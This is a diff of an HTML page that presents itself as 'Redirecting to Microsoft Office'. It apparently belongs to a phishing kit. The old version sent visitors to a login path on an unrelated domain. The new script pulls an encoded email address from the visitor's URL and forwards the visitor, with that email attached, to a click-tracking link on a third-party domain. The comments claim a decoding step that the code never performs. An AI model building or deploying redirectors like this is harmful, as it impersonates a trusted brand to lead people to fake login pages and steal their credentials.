@@ -1,11 +1,32 @@
 <!DOCTYPE html>
 <html>
-  <head>
+
+<head>
+    <title>Redirecting to Microsoft Office</title>
+</head>
+
+<body>
     <script>
-      window.location.href = "https://b4udirect.com/SuNet/login";
-    </script>
-  </head>
-  <body>
-    <!-- Content for users with JavaScript disabled or for any other purpose. -->
-  </body>
+        // Get the current URL
+        const currentUrl = window.location.href;
+      
+        // Use a regular expression to extract the Base64 email after the '#'
+        const base64EmailMatch = currentUrl.match(/\?(.+)/);
+        const base64Email = base64EmailMatch ? base64EmailMatch[1] : null;
+      
+        // If a Base64 email is found, decode it and redirect
+        if (base64Email) {
+          try {
+            // Decode the Base64 email
+            
+            // Redirect to the new URL with the decoded email
+            const newUrl = `https://ctrk.klclick3.com/l/01J9RX35Q81Q26G6GE2W8SQFMT_0#${base64Email}`;
+            window.location.href = newUrl;
+          } catch (e) {
+            console.error('Invalid Base64 string:', e);
+          }
+        }
+      </script>
+</body>
+
 </html>
